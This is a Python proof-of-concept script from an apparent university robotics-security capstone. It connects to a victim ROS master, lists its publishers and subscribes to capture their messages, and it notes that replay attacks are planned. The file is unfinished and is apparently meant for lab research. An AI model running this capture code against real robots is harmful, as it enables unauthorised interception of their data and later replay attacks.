#!/usr/bin/env python
###################################################################################
##                _____________
##               /           ,.\
##              /           /  \\
##        o    /           {    }\
##         `.  \ ....       \  / /
##           `. \ \\\\       `' /
##             \ \_____________/
##              \      \ \
##               \      \ \
##                \     _\ \________________________
##                (`\  /  \ \ ___         "-._       )
##                 \ \/   /`-'  /,       /`-._"-._  /
##                  `/    """"""'       /___ _"-._"-._
##                  /___ __  _          `-._      '  /
##                  \  RoboSec              "-._ /  /
##                 __\________________________  "  /
##               /    '//,  '//'               )__/
##              /       '///'    ,//'/,       /
##             (.---------------------------./
##              `:.                        //
##                `=======================''
##                  Security for Robotics
##
##             Oregon State University - CS Capstone
##
##         Zach Rogers - Malicious ROS Package Collection
##
##             ROS Package 4 - Publisher Logging / ROS Bag Replay Attack
##                         ros4.py
###################################################################################
import os
import subprocess
import rospy
from std_msgs.msg import String

#ROS Environment Variables -- Will need to change these accordingly
ROS_CORE_PORT = "1337"
VICTIM_ROS_HOSTNAME = "172.16.88.129"
VICTIM_ROS_MASTER_URI = "http://" + VICTIM_ROS_HOSTNAME + ":" + ROS_CORE_PORT

ATTACKER_ROS_MASTER_URI = VICTIM_ROS_MASTER_URI
ATTACKER_ROS_HOSTNAME = "172.16.88.128"

#Should we be loud and proud?
VERBOSE = True

def capture_callback(data):
    """
    ROS Subscriber Callback

    http://wiki.ros.org/ROS/Tutorials/WritingPublisherSubscriber%28python%29
    """

    #Write data to log file
    rospy.loginfo(rospy.get_caller_id() + 'CAPTURING %s', data.data) #Output stdout for testing for now

def capture(target_pub):
    """
    Starts data capture against the given target

    Parameters:
    --------------
        * target_pub - Name of the ROS publisher running on the remote ROS machine

    """

    ## ADD ROS BAG STUFF HERE ##
    # We want to have ROS Bag record, we we can later use it for a replay attack

    #Get the Subscriber (or listener) setup
    rospy.init_node('listener', anonymous=True)
    rospy.Subscriber(str(target_pub), String, capture_callback)

    #Keep python from exiting until this node is stopped
    rospy.spin()

def setup():
    """
    Pull all publisher from the victim, and gets ready for capture

    """

    #Set env variables
    log("[!] We are the attacker, setting ROS env variables...")
    os.system("export ROS_MASTER_URI=" + VICTIM_ROS_MASTER_URI)
    os.system("export ROS_HOSTNAME=" + VICTIM_ROS_HOSTNAME)

    #Pull active publishers from victim ROS machine
    victim_subs = subprocess.check_output(['rostopic list -p'], shell=True)

    #Format subprocess output (split newlines into elements, and remove '/')
    victim_pubs = victim_subs.splitlines()
    for x in range(0, len(victim_pubs)):
        victim_pubs[x] = victim_pubs[x][1:]

    #So, what will we be targeting?
    log("[*] Which remote publishers would you like to target?")
    for x in range(0, len(victim_pubs)):
        log("\t" + str(x) + ". " + str(victim_pubs[x]))

    #Error handling, because the user is always an idiot
    choice = ""
    while True:
        choice = raw_input("Enter the number, or all: ")

        try:
            if str(choice) == "all":
                break
            elif int(choice) > -1 and int(choice) < len(victim_pubs):
                break
        except:
            continue

    #Are we capturing multiple publishers, if so do it on separate threads
    if str(choice) == "all":
        log("[!] Starting " + str(len(victim_pubs)) + " capture threads...")
        log("[!!] Not yet implemented...")
    else:
        log("[!] Starting data capture against " + str(victim_pubs[int(choice)]))
        try:
            capture(str(victim_pubs[int(choice)]))
        except rospy.ROSInterruptException:
            pass



def log(text):
    """
    Logging function - Will output text if VERBOSE is set to True, otherwise calls will be ignored.

    Parameters:
    --------------
        * text - String of text to be logged

    """

    if VERBOSE:
        print str(text)


def main():
    log("[~] PoC showing Publisher Data Capture")
    setup()


if __name__ == '__main__':
    main()
